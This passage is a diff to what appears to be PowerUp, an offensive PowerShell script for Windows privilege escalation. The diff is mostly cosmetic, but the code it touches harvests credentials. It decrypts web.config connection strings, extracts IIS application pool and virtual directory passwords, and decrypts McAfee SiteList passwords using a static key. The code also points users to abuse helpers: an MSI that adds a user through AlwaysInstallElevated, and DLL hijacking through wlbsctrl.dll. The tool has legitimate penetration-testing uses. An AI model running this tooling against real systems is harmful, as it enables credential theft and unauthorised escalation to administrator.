                     # Check if aspnet_regiis.exe exists
-                    if (Test-Path  ($aspnet_regiis_path.FullName)){
+                    if (Test-Path  ($AspnetRegiisPath.FullName)) {
 
                         # Setup path for temp web.config to the current user's temp dir
                         $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"
 
                         # Remove existing temp web.config
-                        if (Test-Path  ($WebConfigPath))
-                        {
+                        if (Test-Path  ($WebConfigPath)) {
                             Remove-Item $WebConfigPath
                         }
 
                         # Copy web.config from vdir to user temp for decryption
                         Copy-Item $CurrentPath $WebConfigPath
 
-                        #Decrypt web.config in user temp
-                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
-                        $Null = Invoke-Expression $aspnet_regiis_cmd
+                        # Decrypt web.config in user temp
+                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
+                        $Null = Invoke-Expression $AspnetRegiisCmd
 
                         # Read the data from the web.config in temp
                         [xml]$TMPConfigFile = Get-Content $WebConfigPath
 
                         # Check if the connectionStrings are still encrypted
-                        if ($TMPConfigFile.configuration.connectionStrings.add)
-                        {
+                        if ($TMPConfigFile.configuration.connectionStrings.add) {
 
                             # Foreach connection string add to data table
                             $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
@@ -3065,17 +3128,19 @@ function Get-WebConfig {
                                     $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                     $ConfVdir = $CurrentVdir
                                     $ConfPath = $CurrentPath
-                                    $ConfEnc = "Yes"
+                                    $ConfEnc = 'Yes'
                                     $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                 }
                             }
 
-                        }else{
+                        }
+                        else {
                             Write-Verbose "Decryption of $CurrentPath failed."
                             $False
                         }
-                    }else{
-                        Write-Verbose "aspnet_regiis.exe does not exist in the default location."
+                    }
+                    else {
+                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                         $False
                     }
                 }
@@ -3084,20 +3149,16 @@ function Get-WebConfig {
 
         # Check if any connection strings were found
         if( $DataTable.rows.Count -gt 0 ) {
-
             # Display results in list view that can feed into the pipeline
             $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
         }
         else {
-
-            # Status user
-            Write-Verbose "No connectionStrings found."
+            Write-Verbose 'No connectionStrings found.'
             $False
         }
-
     }
     else {
-        Write-Verbose "Appcmd.exe does not exist in the default location."
+        Write-Verbose 'Appcmd.exe does not exist in the default location.'
         $False
     }
 
@@ -3202,7 +3263,7 @@ function Get-ApplicationHost {
 
             # Check if credentials exists
             if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
-                #Add credentials to database
+                # Add credentials to database
                 $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
             }
         }
@@ -3221,9 +3282,9 @@ function Get-ApplicationHost {
             $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
             $VdirPassword = Invoke-Expression $VdirPasswordCmd
 
-            #Check if credentials exists
+            # Check if credentials exists
             if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
-                #Add credentials to database
+                # Add credentials to database
                 $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
             }
         }
@@ -3235,12 +3296,12 @@ function Get-ApplicationHost {
         }
         else {
             # Status user
-            Write-Verbose "No application pool or virtual directory passwords were found."
+            Write-Verbose 'No application pool or virtual directory passwords were found.'
             $False
         }
     }
     else {
-        Write-Verbose "Appcmd.exe does not exist in the default location."
+        Write-Verbose 'Appcmd.exe does not exist in the default location.'
         $False
     }
 
@@ -3261,6 +3322,14 @@ function Get-SiteListPassword {
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
+
+    .DESCRIPTION
+
+        Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
+        C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
+        credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
+        function that takes advantage of McAfee's static key encryption. Any decrypted credentials
+        are output in custom objects. See links for more information.
 
     .PARAMETER SiteListFilePath
 
@@ -3323,8 +3392,8 @@ function Get-SiteListPassword {
         )
 
         # make sure the appropriate assemblies are loaded
-        Add-Type -assembly System.Security
-        Add-Type -assembly System.Core
+        Add-Type -Assembly System.Security
+        Add-Type -Assembly System.Core
 
         # declare the encoding/crypto providers we need
         $Encoding = [System.Text.Encoding]::ASCII
@@ -3434,7 +3503,7 @@ function Write-UserAddMSI {
     .SYNOPSIS
 
         Writes out a precompiled MSI installer that prompts for a user/group addition.
-        This function can be used to abuse Get-RegAlwaysInstallElevated.
+        This function can be used to abuse Get-RegistryAlwaysInstallElevated.
 
     .EXAMPLE
 
@@ -3470,6 +3539,9 @@ function Invoke-AllChecks {
 
         Runs all functions that check for various Windows privilege escalation opportunities.
 
+        Author: @harmj0y
+        License: BSD 3-Clause
+
     .PARAMETER HTMLReport
 
         Switch. Write a HTML version of the report to SYSTEM.username.html.
@@ -3478,7 +3550,14 @@ function Invoke-AllChecks {
 
         PS C:\> Invoke-AllChecks
 
-        Runs all escalation checks, output statuses for whatever's found.
+        Runs all escalation checks and outputs a status report for discovered issues.
+
+    .EXAMPLE
+
+        PS C:\> Invoke-AllChecks -HTMLReport
+
+        Runs all escalation checks and outputs a status report to SYSTEM.username.html
+        detailing any discovered issues.
 #>
 
     [CmdletBinding()]
@@ -3512,7 +3591,6 @@ function Invoke-AllChecks {
         if($HTMLReport) {
             ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
         }
-        # return
     }
     else{
         "`n`n[*] Checking if user is in a local group with administrative privileges..."
@@ -3541,22 +3619,26 @@ function Invoke-AllChecks {
     $Results = Get-ModifiableServiceFile
     $Results | Format-List
     if($HTMLReport) {
-        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking service permissions..."
     $Results = Get-ModifiableService
     $Results | Format-List
     if($HTMLReport) {
-        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
     }
 
 
-    # .dll hijacking
+    # DLL hijacking
 
-    "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
+    "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
     $Results = Find-PathHijack
-    $Results | Format-List
+    $Results | Foreach-Object {
+        $AbuseString = "Write-HijackDll -DllPath '$($_.Path)\wlbsctrl.dll'"
+        $_ | Add-Member Noteproperty 'AbuseFunction' $AbuseString
+        $_
+    } | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
     }
@@ -3565,9 +3647,8 @@ function Invoke-AllChecks {
     # registry checks
 
     "`n`n[*] Checking for AlwaysInstallElevated registry key..."
-    if (Get-RegAlwaysInstallElevated) {
+    if (Get-RegistryAlwaysInstallElevated) {
         $Out = New-Object PSObject
-        $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
         $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
         $Results = $Out
 
@@ -3578,15 +3659,15 @@ function Invoke-AllChecks {
     }
 
     "`n`n[*] Checking for Autologon credentials in registry..."
-    $Results = Get-RegAutoLogon
+    $Results = Get-RegistryAutoLogon
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
     }
 
 
-    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
-    $Results = Get-VulnAutoRun
+    "`n`n[*] Checking for registry autoruns and configs..."
+    $Results = Get-RegistryAutoRun
     $Results | Format-List
     if($HTMLReport) {
         $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
@@ -3594,11 +3675,11 @@ function Invoke-AllChecks {
 
     # other checks
 
-    "`n`n[*] Checking for vulnerable schtask files/configs..."
-    $Results = Get-VulnSchTask
+    "`n`n[*] Checking for modifiable schtask files/configs..."
+    $Results = Get-ModifiableScheduledTaskFile
     $Results | Format-List
     if($HTMLReport) {
-        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
+        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Modifidable Schask Files</H2>" | Out-File -Append $HtmlReportFile
     }
 
     "`n`n[*] Checking for unattended install files..."
